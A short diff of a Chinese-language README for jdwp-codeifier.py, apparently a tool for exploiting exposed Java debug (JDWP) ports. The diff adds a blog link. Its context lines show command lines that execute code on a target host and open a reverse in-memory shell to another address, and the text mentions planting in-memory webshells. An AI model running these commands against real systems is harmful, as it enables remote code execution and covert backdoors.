@@ -51,6 +51,9 @@ python jdwp-codeifier.py -t 172.17.0.3 -p 8000 -m code -c 'new java.util.Scanner
 通过JS代码还可以动态定义类，加载外部类，插入内存马等等... 各位就自己发挥了
 
 ## 反弹Java内存Shell
+
+https://l3yx.github.io/2023/12/03/%E9%80%9A%E8%BF%87JDWP%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/#%E5%8F%8D%E5%90%91%E5%86%85%E5%AD%98Shell
+
 ```
 python jdwp-codeifier.py -t 172.17.0.3 -p 8000 -m rshell -a 172.17.0.2:8080 -l 0.1
 # -a 指定接收shell的地址
